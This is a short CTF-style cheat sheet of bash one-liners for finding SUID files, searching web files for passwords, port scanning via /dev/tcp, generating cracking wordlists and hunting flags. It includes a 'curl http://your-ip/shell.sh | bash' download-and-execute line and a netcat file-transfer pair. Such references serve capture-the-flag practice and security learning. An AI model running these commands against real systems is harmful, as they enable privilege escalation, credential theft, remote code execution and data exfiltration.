## Useful One-Liners

```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Search for passwords in files
grep -r "password" /var/www/ 2>/dev/null

# Port scan with bash
for p in {1..1024}; do (echo >/dev/tcp/IP/$p) 2>/dev/null && echo "$p open"; done

# Download and execute
curl http://your-ip/shell.sh | bash

# Serve files
python3 -m http.server 8080

# Transfer files with nc
# Receiver:
nc -lvnp 9001 > file.txt
# Sender:
nc -w 3 <IP> 9001 < file.txt

# Quick hash check
echo -n "text" | md5sum
echo -n "text" | sha256sum

# Decode URL encoding
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"

# Generate wordlist with crunch
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Find flag pattern
grep -r "CTF{" /
grep -rE "(flag|FLAG|CTF)\{[^}]+\}" /
```

